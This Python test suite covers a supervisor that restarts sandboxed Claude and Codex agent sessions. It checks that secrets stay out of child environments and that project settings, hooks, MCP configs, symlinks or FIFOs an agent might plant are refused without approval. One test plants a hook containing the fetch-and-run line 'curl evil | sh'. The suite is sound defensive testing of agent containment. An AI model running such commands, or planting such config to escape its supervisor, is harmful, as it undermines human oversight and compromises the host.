"""The detached runner, with fake claude/codex binaries (shell scripts) and short clocks."""
from __future__ import annotations

import unittest

import json
import os
import stat
import textwrap
import threading
import time
from pathlib import Path

from support import posix_only  # noqa: E402
from test_hooks_cli import Env

from swarm import cli as swarm
from swarm.board.autoinit import store_key
from swarm.supervisor import markers, runner, settings as st


def fake(path: Path, body: str) -> str:
    path.write_text("#!/bin/sh\n" + textwrap.dedent(body))
    path.chmod(path.stat().st_mode | stat.S_IXUSR)
    return str(path)


SYSTEMD_RUN_SHIM = """#!/bin/sh
echo "systemd-run $*" >> "$SWARM_SHIM_LOG"
unit=""
while [ $# -gt 0 ]; do
  case "$1" in --unit=*) unit="${1#--unit=}";; --) shift; break;; esac
  shift
done
echo $$ > "$SWARM_SHIM_STATE/$unit.pid"
exec "$@"
"""
# a unit is emulated by the process group of the command systemd-run execs
SYSTEMCTL_SHIM = """#!/bin/sh
echo "systemctl $*" >> "$SWARM_SHIM_LOG"
shift
case "$1" in
  is-system-running) echo running ;;
  show) f="$SWARM_SHIM_STATE/$4.pid"
    if [ -f "$SWARM_SHIM_STATE/$4.state" ]; then cat "$SWARM_SHIM_STATE/$4.state"
    elif [ -f "$f" ] && kill -0 -"$(cat "$f")" 2>/dev/null; then printf 'LoadState=loaded\nActiveState=active\n'
    else printf 'LoadState=not-found\nActiveState=inactive\n'; fi ;;
  kill) sig="${2#--signal=}"; sig="${sig#SIG}"; f="$SWARM_SHIM_STATE/$3.pid"
    [ -f "$f" ] && kill -s "$sig" -- -"$(cat "$f")" 2>/dev/null; exit 0 ;;
  stop) f="$SWARM_SHIM_STATE/$2.pid"; [ -f "$f" ] && kill -s KILL -- -"$(cat "$f")" 2>/dev/null; exit 0 ;;
esac
"""



@unittest.skipUnless(os.path.isdir("/proc"), "the supervisor launches and reaps through /proc (Linux)")
class RunnerBase(Env):
    """The runner fixture (no tests of its own)."""

    def setUp(self):
        super().setUp()
        self.config.write_text(self.config.read_text() + "\n[supervise]\nenabled = true\n")
        self.cfg = swarm.load_config(self.config)
        self.cli("activate", "--job", "J", "--session", "sess-1")
        self.hook("start", agent_id="orig", session="sess-1")
        with self.board() as b:
            self.name = b.agents("J")[0].name
            b.close_agent("orig", "stuck:dead")
            self.r = b.record_restart("J", "orig", "orig", "stuck:dead", "claude", 1.0)
        self.bin = self.tmp / "bin"
        self.bin.mkdir()
        # the replacements' work dir: under an allowed root, rechecked by the runner
        self.workdir = self.tmp / "work"
        self.workdir.mkdir()
        self.cfg["supervise"]["allowed_workdirs"] = [str(self.tmp)]
        self.use_scope_shims()

    def use_scope_shims(self):
        """Sessions run in (fake) systemd scopes: systemd-run/systemctl that record their calls."""
        from unittest import mock
        self.shim = self.tmp / "shim"
        (self.shim / "state").mkdir(parents=True)
        self.log = self.shim / "calls.log"
        self.log.write_text("")
        env = {k: v for k, v in os.environ.items() if k != "SWARM_NO_SYSTEMD"}
        env.update(SWARM_SHIM_LOG=str(self.log), SWARM_SHIM_STATE=str(self.shim / "state"))

        def baked(text: str) -> str:   # the shims get their paths baked in: the child env is an allowlist
            return text.replace("$SWARM_SHIM_LOG", str(self.log)).replace(
                "$SWARM_SHIM_STATE", str(self.shim / "state"))
        for patch in (mock.patch.dict(os.environ, env, clear=True),
                      mock.patch.object(runner, "SYSTEMD_RUN", fake(self.shim / "systemd-run", baked(SYSTEMD_RUN_SHIM[10:]))),
                      mock.patch.object(runner, "SYSTEMCTL", fake(self.shim / "systemctl", baked(SYSTEMCTL_SHIM[10:])))):
            patch.start()
            self.addCleanup(patch.stop)

    def calls(self):
        return self.log.read_text().splitlines()

    def unit(self):
        run = next(c for c in self.calls() if c.startswith("systemd-run"))
        return run.split("--unit=")[1].split()[0]

    def run_dict(self, argv, harness="claude", session="3f0c1e9a-0000-4000-8000-000000000001",
                 limit=5.0, enrol=5.0):
        m = markers.write_resume_marker(self.cfg, "J", self.r.id, resume_of="orig", name=self.name,
                                        harness=harness, session_id=session if harness == "claude" else None)
        return {"restart_id": self.r.id, "job": "J", "name": self.name, "harness": harness,
                "resume_of": "orig", "marker": str(m), "argv": argv, "cwd": str(self.workdir), "stdin": "BRIEF",
                "session_id": session if harness == "claude" else None, "limit_seconds": limit,
                "enrol_seconds": enrol, "config": str(self.config), "board": store_key(self.cfg)}

    def enrol_soon(self, key, delay=0.2):
        def go():
            time.sleep(delay)
            with self.board() as b:
                b.claim_resume(key, "orig", "J")
        t = threading.Thread(target=go)
        t.start()
        self.addCleanup(t.join)

    def execute(self, run):
        runner.write_run(run)
        return runner.execute(self.cfg, run, poll=0.05, board_every=0.1)

    def restart(self):
        with self.board() as b:
            return b.restarts(job="J")[0]


class ChildEnvTests(RunnerBase):
    """A replacement's environment is an allowlist, never the
    supervisor's whole environment (PGPASSWORD, cloud keys, tokens)."""

    SECRETS = {"PGPASSWORD": "pg-secret-1", "AWS_SECRET_ACCESS_KEY": "aws-secret-2", "FOO_TOKEN": "tok-3",
               "PGSERVICEFILE": "/x", "ANTHROPIC_API_KEY": "sk-ant-4", "RANDOM_VAR": "r"}

    def setUp(self):
        super().setUp()
        from unittest import mock
        p = mock.patch.dict(os.environ, self.SECRETS)
        p.start()
        self.addCleanup(p.stop)

    def test_child_env_allowlist(self):
        env = runner._child_env("tok", "r1-abc")
        for k in self.SECRETS:
            self.assertNotIn(k, env)
        self.assertFalse(any(v in self.SECRETS.values() for v in env.values()))
        self.assertEqual((env["PATH"], env["HOME"]), (os.environ["PATH"], os.environ["HOME"]))
        self.assertEqual((env[markers.TOKEN_ENV], env[runner.RUN_ENV]), ("tok", "r1-abc"))

    def test_manager_env_allowlist(self):
        env = runner._manager_env()
        for k in self.SECRETS:
            self.assertNotIn(k, env)
        self.assertEqual(env["PATH"], os.environ["PATH"])

    def test_pass_env_opt_in(self):
        env = runner._child_env(None, "r1-abc", pass_env=["ANTHROPIC_API_KEY", "PGPASSWORD", "NOT_SET"])
        self.assertEqual((env["ANTHROPIC_API_KEY"], env["PGPASSWORD"]), ("sk-ant-4", "pg-secret-1"))
        self.assertNotIn("NOT_SET", env)
        self.assertNotIn("AWS_SECRET_ACCESS_KEY", env)

    def test_the_session_never_sees_the_secrets(self):
        self.cfg["supervise"]["pass_env"] = ["FOO_TOKEN"]
        argv = [fake(self.bin / "claude", 'env > "$0.env"; exit 3\n')]
        self.execute(self.run_dict(argv))
        seen = (self.bin / "claude.env").read_text()
        for k in ("PGPASSWORD", "AWS_SECRET_ACCESS_KEY", "ANTHROPIC_API_KEY", "RANDOM_VAR"):
            self.assertNotIn(f"{k}=", seen)
        self.assertIn("FOO_TOKEN=tok-3", seen)
        self.assertIn(f"{runner.RUN_ENV}=r{self.r.id}-", seen)


class PlantedMarkerRunnerTests(RunnerBase):
    """The runner reads its sandbox-writable resume marker without blocking."""

    def test_a_fifo_marker_does_not_block_the_runner(self):
        from test_supervise_markers import _within
        m = markers.resume_marker_path(self.cfg, "J", self.r.id)
        m.parent.mkdir(parents=True, exist_ok=True)
        os.mkfifo(m)
        self.fifos = [m]
        self.assertIsNone(_within(self, lambda: runner._marker_session(str(m))))
        self.assertEqual(_within(self, lambda: runner._token_for(
            {"harness": "codex", "marker": str(m)})), (None, "cancelled"))


CONFIG_PATHS = (".claude/settings.json", ".claude/settings.local.json", ".claude/hooks/pre.sh",
                ".claude/agents/evil.md", ".mcp.json", ".codex/config.toml", "AGENTS.override.md")


class ProjectConfigTests(RunnerBase):
    """A work dir, or a parent up to the allowed root, holding
    project configuration a sandboxed agent could have planted (settings, hooks, agents, MCP
    servers, Codex config) is refused unless the user approved exactly those files out of band.
    The check runs on the directories the runner opened, not on paths."""

    def setUp(self):
        super().setUp()
        from swarm.supervisor import command
        self.command = command
        self.root = self.tmp / "src"
        self.parent = self.root / "a"
        self.proj = self.parent / "proj"
        self.proj.mkdir(parents=True)
        self.cfg["supervise"]["allowed_workdirs"] = [str(self.root)]
        self.argv = [fake(self.bin / "claude", 'touch "$0.ran"; exit 3\n')]
        from unittest import mock
        p = mock.patch.object(runner, "CONFIG_HOLD_MAX", 0.0)   # no hold here unless a test asks
        p.start()
        self.addCleanup(p.stop)

    def run_in(self, cwd):
        return dict(self.run_dict(self.argv), cwd=str(cwd))

    def ran(self):
        p = self.bin / "claude.ran"
        out = p.exists()
        if out:
            p.unlink()
        return out

    def plant(self, where, rel, text="{}"):
        p = where / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text)
        return p

    def fresh_restart(self):
        with self.board() as b:
            n = len(b.restarts(job="J"))
            self.hook("start", agent_id=f"o{n}", session="sess-1")
            b.close_agent(f"o{n}", "stuck:dead")
            self.r = b.record_restart("J", f"o{n}", f"o{n}", "stuck:dead", "claude", 1.0)

    def test_a_clean_workdir_launches(self):
        self.assertNotEqual(self.execute(self.run_in(self.proj)), "refused")
        self.assertTrue(self.ran())

    def test_workdir_with_unapproved_project_settings_refused(self):
        import shutil
        for where in (self.proj, self.parent, self.root):
            for rel in CONFIG_PATHS:
                with self.subTest(where=where.name, rel=rel):
                    f = self.plant(where, rel)
                    self.fresh_restart()
                    self.assertEqual(self.execute(self.run_in(self.proj)), "refused")
                    self.assertFalse(self.ran())
                    self.assertIn(rel.split("/")[0], self.restart_row().refused_reason
                                  if hasattr(self.restart_row(), "refused_reason") else self.log_text())
                    # approved: allowed
                    self.command.save_approvals(self.command.approval_candidates(self.cfg, str(self.proj)))
                    self.fresh_restart()
                    self.assertNotEqual(self.execute(self.run_in(self.proj)), "refused")
                    self.assertTrue(self.ran())
                    # changed after the approval: refused again
                    f.write_text('{"hooks": "changed"}')
                    self.fresh_restart()
                    self.assertEqual(self.execute(self.run_in(self.proj)), "refused")
                    self.assertFalse(self.ran())
                    top = where / rel.split("/")[0]
                    shutil.rmtree(top) if top.is_dir() else top.unlink()

    def _held_execute(self, hold: float):
        """execute() in a thread, with a config hold of `hold` seconds re-checked every 0.05 s."""
        from unittest import mock
        box = {}
        for p in (mock.patch.object(runner, "CONFIG_HOLD_MAX", hold),
                  mock.patch.object(runner, "CONFIG_HOLD_POLL", 0.05)):
            p.start()
            self.addCleanup(p.stop)
        t = threading.Thread(target=lambda: box.setdefault("out", self.execute(self.run_in(self.proj))))
        t.start()
        self.addCleanup(t.join, 30)
        return t, box

    def _board_says(self, text, within=10.0):
        end = time.monotonic() + within
        while time.monotonic() < end:
            with self.board() as b:
                if any(text in m.message for m in b.recent_messages(50, job="J")):
                    return True
            time.sleep(0.05)
        return False

    def test_config_that_appears_before_the_launch_is_held_until_approved(self):
        # project config planted between the pass and the launch is recoverable by
        # approval, like the pass's own hold: the runner waits (posted once), never launches
        # unapproved, and launches once approved; not a permanent refusal
        self.plant(self.proj, ".mcp.json")
        t, box = self._held_execute(20.0)
        self.assertTrue(self._board_says("waiting for approval"), "the hold was not posted")
        time.sleep(0.3)
        self.assertFalse(self.ran())                          # held: nothing launched
        self.assertTrue(t.is_alive())
        self.command.save_approvals(self.command.approval_candidates(self.cfg, str(self.proj)))
        t.join(20)
        self.assertFalse(t.is_alive())
        self.assertNotEqual(box["out"], "refused")
        self.assertTrue(self.ran())
        with self.board() as b:
            held = [m for m in b.recent_messages(50, job="J") if "waiting for approval" in m.message]
        self.assertEqual(len(held), 1)                        # posted once, not per re-check

    def test_a_hold_not_approved_in_time_is_refused(self):
        self.plant(self.proj, ".mcp.json")
        t, box = self._held_execute(0.5)
        t.join(20)
        self.assertEqual(box["out"], "refused")
        self.assertFalse(self.ran())
        self.assertIn("not approved within", self.restart_row().refused_reason
                      if hasattr(self.restart_row(), "refused_reason") else self.log_text())

    def test_a_hold_ends_when_the_job_closes(self):
        self.plant(self.proj, ".mcp.json")
        t, box = self._held_execute(20.0)
        self.assertTrue(self._board_says("waiting for approval"))
        self.cli("deactivate", "--job", "J", "--status", "cancelled", "--force")
        t.join(20)
        self.assertEqual(box["out"], "cancelled")
        self.assertFalse(self.ran())

    def test_a_new_file_in_an_approved_hooks_dir_is_unapproved(self):
        self.plant(self.proj, ".claude/hooks/a.sh", "echo a")
        self.command.save_approvals(self.command.approval_candidates(self.cfg, str(self.proj)))
        self.assertNotEqual(self.execute(self.run_in(self.proj)), "refused")
        self.plant(self.proj, ".claude/hooks/b.sh", "curl evil | sh")
        self.fresh_restart()
        self.assertEqual(self.execute(self.run_in(self.proj)), "refused")

    def test_links_and_fifos_are_refused_and_unapprovable(self):
        from test_supervise_markers import _within
        victim = self.tmp / "victim.json"
        victim.write_text("{}")
        cases = [lambda: (self.proj / ".mcp.json").symlink_to(victim),
                 lambda: (self.proj / ".claude").symlink_to(self.tmp),
                 lambda: os.link(victim, self.proj / ".mcp.json"),
                 lambda: os.mkfifo(self.proj / ".mcp.json"),
                 lambda: (self.proj / ".codex").mkdir() or (self.proj / ".codex" / "x").symlink_to(victim)]
        for i, plant in enumerate(cases):
            with self.subTest(case=i):
                self._clean()
                plant()
                self.fifos = [self.proj / ".mcp.json"]
                self.fresh_restart()
                self.assertEqual(_within(self, lambda: self.execute(self.run_in(self.proj)), 5), "refused")
                self.assertFalse(self.ran())
                with self.assertRaises(ValueError):   # O_NONBLOCK: a FIFO can't block this either
                    self.command.approval_candidates(self.cfg, str(self.proj))
        self.assertEqual(victim.read_text(), "{}")

    def _clean(self):
        import shutil
        for n in (".mcp.json", ".claude", ".codex"):
            p = self.proj / n
            if p.is_dir() and not p.is_symlink():
                shutil.rmtree(p)
            elif os.path.lexists(p):
                p.unlink()

    def test_approval_is_per_directory(self):
        other = self.root / "b" / "proj"
        other.mkdir(parents=True)
        self.plant(self.proj, ".mcp.json")
        self.plant(other, ".mcp.json")
        self.command.save_approvals(self.command.approval_candidates(self.cfg, str(self.proj)))
        self.assertEqual(self.execute(self.run_in(other)), "refused")

    def test_approval_candidates_refuse_a_disallowed_dir(self):
        with self.assertRaises(ValueError):
            self.command.approval_candidates(self.cfg, str(self.tmp / "work"))

    def test_the_approval_store_is_private_and_never_followed(self):
        from swarm.supervisor import privfs
        self.plant(self.proj, ".mcp.json")
        entries = self.command.approval_candidates(self.cfg, str(self.proj))
        self.assertEqual([(e["dir"], e["file"]) for e in entries], [(str(self.proj), ".mcp.json")])
        self.command.save_approvals(entries)
        p = st.private_dir() / self.command.APPROVALS
        self.assertEqual(stat.S_IMODE(p.stat().st_mode), 0o600)
        victim = self.tmp / "victim"
        victim.write_text("keep")
        p.unlink()
        p.symlink_to(victim)
        self.assertEqual(self.command.load_approvals(), set())
        self.command.save_approvals(entries)
        self.assertEqual(victim.read_text(), "keep")
        self.assertEqual(len(self.command.load_approvals()), 1)

    def test_the_check_runs_on_the_opened_inode(self):
        """The directory is opened, then renamed away and replaced by a clean one: the check
        (on the descriptor) still sees the original's planted settings, and nothing launches."""
        from unittest import mock
        self.plant(self.proj, ".claude/settings.json", '{"hooks": {}}')
        real = self.command.workdir_config_problem

        def swap_then_check(fd, where, approvals):
            if where == str(self.proj) and not (self.parent / "proj.orig").exists():
                self.proj.rename(self.parent / "proj.orig")
                self.proj.mkdir()                                  # a clean directory at the path
            return real(fd, where, approvals)
        with mock.patch.object(self.command, "workdir_config_problem", side_effect=swap_then_check):
            self.assertEqual(self.execute(self.run_in(self.proj)), "refused")
        self.assertFalse(self.ran())

    def test_a_clean_opened_inode_launches_there_after_a_swap(self):
        from unittest import mock
        real = self.command.workdir_config_problem

        def swap_then_check(fd, where, approvals):
            if where == str(self.proj) and not (self.parent / "proj.orig").exists():
                self.proj.rename(self.parent / "proj.orig")
                self.plant(self.proj, ".claude/settings.json")    # the path now holds settings
            return real(fd, where, approvals)
        argv = [fake(self.bin / "claude", 'touch landed; exit 3\n')]
        with mock.patch.object(self.command, "workdir_config_problem", side_effect=swap_then_check):
            self.assertNotEqual(self.execute(dict(self.run_dict(argv), cwd=str(self.proj))), "refused")
        self.assertTrue((self.parent / "proj.orig" / "landed").exists())
        self.assertFalse((self.proj / "landed").exists())

    def restart_row(self):
        return self.restart()

    def log_text(self):
        try:
            return st.log_path().read_text()
        except OSError:
            return ""


class BoardNamespaceTests(RunnerBase):
    """Two boards used by one OS user have colliding restart ids;
    their run, lock and output files live apart, under runs/<hash of the board key>/."""

    def other_cfg(self):
        import copy
        cfg = copy.deepcopy(self.cfg)
        cfg["memory"] = {"store": "another-board"}
        cfg["board"]["backend"] = "memory"
        self.assertNotEqual(store_key(cfg), store_key(self.cfg))
        return cfg

    def test_run_lock_and_output_files_are_namespaced_by_board(self):
        other = self.other_cfg()
        rid = self.r.id
        self.assertNotEqual(runner.run_file(rid, self.cfg), runner.run_file(rid, other))
        self.assertNotEqual(runner.lock_file(rid, self.cfg), runner.lock_file(rid, other))
        for cfg in (self.cfg, other):
            d = runner.run_dir(cfg)
            self.assertEqual(d.parent, st.runs_dir())
            self.assertNotIn(store_key(cfg), str(d))              # a hash, not the key itself
        mine = self.run_dict(["true"])
        theirs = dict(mine, board=store_key(other), name="Other Name")
        runner.write_run(mine)
        runner.write_run(theirs)
        self.assertEqual(json.loads(runner.run_file(rid, self.cfg).read_text())["name"], self.name)
        self.assertEqual(json.loads(runner.run_file(rid, other).read_text())["name"], "Other Name")
        fd = runner.own(rid, self.cfg)
        self.addCleanup(os.close, fd)
        fd2 = runner.own(rid, other)                                  # not the same lock
        self.assertIsNotNone(fd2)
        os.close(fd2)
        self.assertEqual(stat.S_IMODE(os.stat(runner.run_dir(self.cfg)).st_mode), 0o700)

    def test_reap_only_looks_in_its_own_boards_dir(self):
        other = self.other_cfg()
        theirs = self.run_dict(["true"])
        theirs.pop("stdin")
        theirs.update(board=store_key(other), exited=True, board_done=True, outcome="completed")
        runner.write_run(theirs)
        with self.board() as b:
            self.assertEqual(runner.reap(self.cfg, b), 0)
        self.assertTrue(runner.run_file(self.r.id, other).exists())
        self.assertIsNone(self.restart().outcome)
        self.assertFalse(runner.has_run(self.cfg, self.r.id))
        self.assertTrue(runner.has_run(other, self.r.id))

    def test_a_legacy_run_file_of_this_board_is_adopted(self):
        st.ensure_private_dir(self.cfg)
        run = self.run_dict(["true"])
        run.pop("stdin")
        run.update(exited=True, outcome="completed")
        legacy = st.runs_dir() / f"r{self.r.id}.json"               # where 0.1.0 betas kept it
        legacy.write_text(json.dumps(run))
        self.assertTrue(runner.has_run(self.cfg, self.r.id))
        with self.board() as b:
            self.assertEqual(runner.reap(self.cfg, b), 1)
        self.assertEqual(self.restart().outcome, "completed")
        self.assertFalse(legacy.exists())

    def test_a_legacy_run_file_of_another_board_is_left_alone(self):
        st.ensure_private_dir(self.cfg)
        run = self.run_dict(["true"])
        run.pop("stdin")
        run.update(exited=True, outcome="completed", board="sqlite-another-board")
        legacy = st.runs_dir() / f"r{self.r.id}.json"
        legacy.write_text(json.dumps(run))
        self.assertFalse(runner.has_run(self.cfg, self.r.id))
        with self.board() as b:
            self.assertEqual(runner.reap(self.cfg, b), 0)
        self.assertTrue(legacy.exists())
        self.assertIsNone(self.restart().outcome)


class RunnerTests(RunnerBase):
    def test_completed_claude(self):
        sid = "3f0c1e9a-0000-4000-8000-000000000001"
        argv = [fake(self.bin / "claude", 'cat > "$0.stdin"; sleep 0.5; echo \'{"subtype":"success"}\'\n')]
        self.enrol_soon(sid)
        self.assertEqual(self.execute(self.run_dict(argv)), "completed")
        self.assertEqual((self.bin / "claude.stdin").read_text(), "BRIEF")
        r = self.restart()
        self.assertEqual((r.outcome, r.new_agent_key), ("completed", sid))
        with self.board() as b:
            a = next(x for x in b.agents("J") if x.agent_key == sid)
            posts = [m.message for m in b.recent_messages(5, job="J")]
        self.assertEqual(a.status, "completed")
        self.assertTrue(any("ended: completed" in p for p in posts))
        self.assertFalse(runner.run_file(self.r.id, self.cfg).exists())
        self.assertFalse(any(self.markers.glob("*--resume-r*.json")))

    def test_timeout_kills_process_group(self):
        sid = "3f0c1e9a-0000-4000-8000-000000000001"
        argv = [fake(self.bin / "claude", "sleep 30 & wait\n")]
        self.enrol_soon(sid)
        t0 = time.monotonic()
        self.assertEqual(self.execute(self.run_dict(argv, limit=1.0)), "timeout")
        self.assertLess(time.monotonic() - t0, 15)
        with self.board() as b:
            a = next(x for x in b.agents("J") if x.agent_key == sid)
        self.assertEqual(a.left_reason, "limit:timeout")

    def test_not_enrolled_is_killed(self):
        argv = [fake(self.bin / "claude", "sleep 30\n")]
        self.assertEqual(self.execute(self.run_dict(argv, enrol=0.5)), "not_enrolled")
        self.assertEqual(self.restart().outcome, "not_enrolled")

    def test_fast_failure_recorded(self):
        argv = [fake(self.bin / "claude", "echo 'model not found' >&2; exit 3\n")]
        self.assertEqual(self.execute(self.run_dict(argv)), "failed")
        self.assertEqual(self.restart().outcome, "failed")

    def test_max_turns(self):
        sid = "3f0c1e9a-0000-4000-8000-000000000001"
        argv = [fake(self.bin / "claude", "sleep 0.5; echo '{\"subtype\":\"error_max_turns\"}'; exit 1\n")]
        self.enrol_soon(sid)
        self.assertEqual(self.execute(self.run_dict(argv)), "max_turns")

    def test_codex_binds_thread_id(self):
        tid = "00000000-0000-4000-8000-0000000000aa"
        argv = [fake(self.bin / "codex", f"cat >/dev/null; echo '{{\"type\":\"thread.started\",\"thread_id\":\"{tid}\"}}'; sleep 1\n")]
        run = self.run_dict(argv, harness="codex")
        self.enrol_soon(tid, delay=0.5)
        self.assertEqual(self.execute(run), "completed")
        self.assertEqual(self.restart().new_agent_key, tid)

    def test_closed_by_sweep_meanwhile_is_stuck(self):
        sid = "3f0c1e9a-0000-4000-8000-000000000001"
        argv = [fake(self.bin / "claude", "sleep 30\n")]
        self.enrol_soon(sid)

        def close_later():
            time.sleep(0.6)
            with self.board() as b:
                b.close_agent(sid, "stuck:silent")
        t = threading.Thread(target=close_later)
        t.start()
        self.addCleanup(t.join)
        self.assertEqual(self.execute(self.run_dict(argv)), "stuck")

    def test_finish_keeps_run_file_when_board_down_and_reap_finishes(self):
        run = self.run_dict(["true"])
        run["agent_key"] = None
        runner.write_run(run)
        self.h.set_available(False)
        self.assertFalse(runner.finish(self.cfg, run, "failed"))
        self.assertTrue(runner.run_file(self.r.id, self.cfg).exists())
        self.h.set_available(True)
        with self.board() as b:
            self.assertEqual(runner.reap(self.cfg, b), 1)
        self.assertEqual(self.restart().outcome, "failed")

    def test_reap_enforces_wall_clock_of_orphaned_child(self):
        import subprocess
        child = subprocess.Popen(["sleep", "30"], start_new_session=True, env=tagged_env())
        self.addCleanup(_end, child)
        run = self.run_dict(["true"])
        run.update(runner_pid=None, child_pid=child.pid, started_epoch=time.time() - 10, limit_seconds=1.0,
                   run_tag=TAG, child_start=runner._proc_start(child.pid))
        runner.write_run(run)
        with self.board() as b:
            self.assertEqual(runner.reap(self.cfg, b), 1)
        self.assertIsNotNone(child.wait(5))
        self.assertEqual(self.restart().outcome, "timeout")

    # ---- beyond the brief: stdin never blocks the clock, launch errors, no double finish ----

    def test_big_brief_to_a_child_that_never_reads_still_times_out(self):
        sid = "3f0c1e9a-0000-4000-8000-000000000001"
        argv = [fake(self.bin / "claude", "sleep 30\n")]
        run = self.run_dict(argv, limit=1.0, enrol=30.0)
        run["stdin"] = "B" * (1 << 20)   # far above a pipe buffer
        t0 = time.monotonic()
        self.assertEqual(self.execute(run), "timeout")
        self.assertLess(time.monotonic() - t0, 15)

    def test_missing_binary_is_failed_and_finished(self):
        self.assertEqual(self.execute(self.run_dict([str(self.bin / "nope")])), "failed")
        self.assertEqual(self.restart().outcome, "failed")
        self.assertFalse(runner.run_file(self.r.id, self.cfg).exists())

    def test_row_closed_before_the_runner_saw_it_active_is_stuck(self):
        sid = "3f0c1e9a-0000-4000-8000-000000000001"
        argv = [fake(self.bin / "claude", "sleep 30\n")]
        with self.board() as b:
            b.claim_resume(sid, "orig", "J")
            b.close_agent(sid, "stuck:dead")
        self.assertEqual(self.execute(self.run_dict(argv)), "stuck")

    def test_reap_leaves_runs_of_a_live_runner_alone(self):
        run = self.run_dict(["true"])
        run.update(exited=True, outcome="completed")
        runner.write_run(run)
        fd = runner.own(self.r.id, self.cfg)                 # a live runner holds its run lock
        self.addCleanup(os.close, fd)
        with self.board() as b:
            self.assertEqual(runner.reap(self.cfg, b), 0)
        self.assertTrue(runner.run_file(self.r.id, self.cfg).exists())
        self.assertIsNone(self.restart().outcome)

    def test_run_file_is_private(self):
        p = runner.write_run(self.run_dict(["true"]))
        self.assertEqual(stat.S_IMODE(p.stat().st_mode), 0o600)

    def test_start_detaches_a_runner_that_gets_its_run_on_stdin(self):
        import subprocess
        seen = {}

        class P:
            pid = 4242
            stdin = None

        def popen(argv, **kw):
            seen.update(argv=argv, **kw)
            return P()
        run = self.run_dict(["true"])
        self.assertEqual(runner.start(self.cfg, run, popen=popen), 4242)
        fd = seen["pass_fds"][0]
        self.assertEqual(seen["argv"][-4:], ["-m", "swarm.supervisor.runner", "--lock-fd", str(fd)])
        self.assertEqual(seen["stdin"], subprocess.PIPE)
        self.assertTrue(seen["start_new_session"])
        self.assertTrue(runner.run_file(self.r.id, self.cfg).exists())

    def test_main_executes_the_run_on_stdin(self):
        import io
        from unittest import mock
        run = self.run_dict(["true"])
        with mock.patch.object(runner, "execute", return_value="completed") as ex, \
                mock.patch("sys.stdin", io.TextIOWrapper(io.BytesIO(json.dumps(run).encode()))):
            self.assertEqual(runner.main([]), 0)
        self.assertEqual(ex.call_args[0][1]["restart_id"], self.r.id)

    def test_main_refuses_a_run_that_fails_its_checks(self):
        import io
        from unittest import mock
        run = dict(self.run_dict(["true"]), marker=str(self.tmp / "victim"))
        with mock.patch.object(runner, "execute") as ex, \
                mock.patch("sys.stdin", io.TextIOWrapper(io.BytesIO(json.dumps(run).encode()))):
            self.assertEqual(runner.main([]), 1)
        ex.assert_not_called()

    def test_codex_gets_a_token_its_hooks_can_bind_by(self):
        tid = "00000000-0000-4000-8000-0000000000ab"
        argv = [fake(self.bin / "codex", 'printf %s "$SWARM_RESUME_TOKEN" > "$0.token"; cat >/dev/null; '
                                         'sleep 1\n')]
        run = self.run_dict(argv, harness="codex")

        def hook_binds_first():   # what the hook does on the session's first tool call
            for _ in range(100):
                tok = (self.bin / "codex.token")
                if tok.exists() and tok.read_text():
                    break
                time.sleep(0.02)
            self.assertIsNotNone(markers.resume_by_token(self.cfg, tok.read_text(), tid))
            with self.board() as b:
                b.claim_resume(tid, "orig", "J")
        t = threading.Thread(target=hook_binds_first)
        t.start()
        self.addCleanup(t.join)
        self.assertEqual(self.execute(run), "completed")      # enrolled though thread.started never came
        self.assertEqual(len((self.bin / "codex.token").read_text()), 32)
        self.assertEqual(self.restart().new_agent_key, tid)

    def test_codex_whose_marker_is_gone_is_cancelled_unstarted(self):
        argv = [fake(self.bin / "codex", 'touch "$0.ran"\n')]
        run = self.run_dict(argv, harness="codex")
        markers.remove_resume_marker(Path(run["marker"]))
        self.assertEqual(self.execute(run), "cancelled")
        self.assertFalse((self.bin / "codex.ran").exists())


# Ignores SIGTERM, so only SIGKILL stops it. It gives up by itself after SURVIVOR_SECONDS (default 60),
# far longer than any test needs it: a test process killed mid-run never runs its cleanups, and an
# unbounded survivor then lives on in whatever cgroup ran the suite, holding up that unit's stop.
SURVIVOR = ("sh -c 'trap \"\" TERM; echo $$ > \"$1\"; i=0; while [ $i -lt ${SURVIVOR_SECONDS:-60} ]; "
            "do sleep 1; i=$((i+1)); done' x \"$0.pid\" &\n")



class SurvivorFixtureTests(unittest.TestCase):
    @posix_only("needs POSIX signals and process groups")
    def test_survivor_ends_by_itself_when_its_test_never_cleans_up(self):
        # a test process killed mid-run never runs its cleanups: the survivor must not live on
        import shutil, signal, subprocess, tempfile
        d = Path(tempfile.mkdtemp(prefix="swarm-survivor-", dir=os.environ.get("TMPDIR")))
        self.addCleanup(shutil.rmtree, d, ignore_errors=True)
        pidfile = d / "s.pid"
        subprocess.run(["sh", "-c", SURVIVOR + "exit 0\n", str(d / "s")],
                       env={**os.environ, "SURVIVOR_SECONDS": "1"}, check=True)
        for _ in range(100):
            if pidfile.exists() and pidfile.read_text().strip():
                break
            time.sleep(0.02)
        pid = int(pidfile.read_text())
        self.addCleanup(_kill_quietly, pid)
        os.kill(pid, signal.SIGTERM)                       # ignored, as the fixture intends
        self.assertTrue(_gone(pid, within=5.0))


TAG = "r1-0123456789abcdef"


def tagged_env(tag: str = TAG) -> dict:
    """The environment a session of the run tagged `tag` has (runner._child_env)."""
    return {**os.environ, runner.RUN_ENV: tag}


def _end(p) -> None:
    if p.poll() is None:
        p.kill()
    p.wait()


def _kill_quietly(pid: int) -> None:
    import signal
    try:
        os.kill(pid, signal.SIGKILL)
    except OSError:
        pass


def _gone(pid: int, within: float = 3.0) -> bool:
    """pid no longer runs (gone, or a zombie waiting for init)."""
    end = time.monotonic() + within
    while time.monotonic() < end:
        try:
            state = Path(f"/proc/{pid}/stat").read_text().rsplit(")", 1)[1].split()[0]
        except OSError:
            return True
        if state == "Z":
            return True
        time.sleep(0.05)
    return False


class RunnerFixTests(RunnerTests):
    """Startup ownership, the whole process group, bounded redacted output, marker
    removal retried, the end posted once."""

    def setUp(self):
        super().setUp()
        from unittest import mock
        p = mock.patch.object(runner, "KILL_GRACE", 0.5)
        p.start()
        self.addCleanup(p.stop)

    def _survivor_pid(self, name="claude"):
        f = self.bin / f"{name}.pid"
        for _ in range(100):
            if f.exists() and f.read_text().strip():
                pid = int(f.read_text())
                self.addCleanup(_kill_quietly, pid)   # never leak it when a test fails
                return pid
            time.sleep(0.02)
        self.fail("no survivor pid")

    def posts(self):
        with self.board() as b:
            return [m.message for m in b.recent_messages(50, job="J") if "ended:" in m.message]

    def test_a_started_run_is_owned_before_its_run_file_exists_and_until_its_runner_ends(self):
        import subprocess
        procs = []

        def popen(argv, **kw):   # a stand-in runner that just inherits the locked descriptor
            self.assertTrue(runner.run_file(self.r.id, self.cfg).exists())
